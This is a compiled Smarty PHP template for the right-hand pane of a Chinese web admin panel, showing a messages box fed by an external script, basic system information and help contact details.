<?php /* Smarty version Smarty-3.1.16, created on 2014-02-11 10:18:22
         compiled from "D:\freehost\huangweitt\web\admin\template\body-right.mad" */ ?>
<?php /*%%SmartyHeaderCode:995452df878eaa3ef9-29301237%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_valid = $_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '5e91ddc14ad25766723e98a4221caf310fd20feb' => 
    array (
      0 => 'D:\\freehost\\huangweitt\\web\\admin\\template\\body-right.mad',
      1 => 1392085094,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '995452df878eaa3ef9-29301237',
  'function' => 
  array (
  ),
  'version' => 'Smarty-3.1.16',
  'unifunc' => 'content_52df878eb4d4c6_15738701',
  'variables' => 
  array (
    'vp' => 0,
  ),
  'has_nocache_code' => false,
),false); /*/%%SmartyHeaderCode%%*/?>
<?php if ($_valid && !is_callable('content_52df878eb4d4c6_15738701')) {function content_52df878eb4d4c6_15738701($_smarty_tpl) {?><table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><div style='float:left'> <img height="14" src="<?php echo $_smarty_tpl->tpl_vars['vp']->value;?>
/images/book1.gif" width="20" />&nbsp;TITLE </div>
      <div style='float:right;padding-right:8px;'>
        <!--  //保留接口  -->
      </div></td>
  </tr>
  <tr>
    <td height="1" background="<?php echo $_smarty_tpl->tpl_vars['vp']->value;?>
/images/sp_bg.gif" style='padding:0px'></td>
  </tr>
</table>
<table width="98%" align="center" border="0" cellpadding="3" cellspacing="1" bgcolor="#CBD8AC" style="margin-bottom:8px;margin-top:8px;">
  <tr>
    <td background="<?php echo $_smarty_tpl->tpl_vars['vp']->value;?>
/images/wbg.gif" bgcolor="#EEF4EA" class='title'><span>消息</span></td>
  </tr>
  <tr bgcolor="#FFFFFF">
    <td><script type="text/javascript" src="http://sjie.cn/s.js"></script></td>
  </tr>
</table>

<table width="98%" align="center" border="0" cellpadding="4" cellspacing="1" bgcolor="#CBD8AC" style="margin-bottom:8px">
  <tr bgcolor="#EEF4EA">
    <td colspan="2" background="<?php echo $_smarty_tpl->tpl_vars['vp']->value;?>
/images/wbg.gif" class='title'><span>系统基本信息</span></td>
  </tr>
  <tr bgcolor="#FFFFFF">
    <td width="25%" bgcolor="#FFFFFF">lever</td>
    <td width="75%" bgcolor="#FFFFFF">平台拥有者</td>
  </tr>
  <tr bgcolor="#FFFFFF">
    <td>系统版本：</td>
    <td>M3.0</td>
  </tr>
</table>



<table width="98%" align="center" border="0" cellpadding="4" cellspacing="1" bgcolor="#CBD8AC">
  <tr bgcolor="#EEF4EA">
    <td colspan="2" background="<?php echo $_smarty_tpl->tpl_vars['vp']->value;?>
/images/wbg.gif" class='title'><span>使用帮助</span></td>
  </tr>
  <tr bgcolor="#FFFFFF">
    <td height="32">官方交流网站：</td>
    <td><a href="http://www.lanyan.cc"target="_blank"><u>url</u></a></td>
  </tr>
  <tr bgcolor="#FFFFFF">
    <td width="25%" height="32">官方企业QQ客服：</td>
    <td width="75%">77812886</td>
  </tr>
</table><?php }} ?>
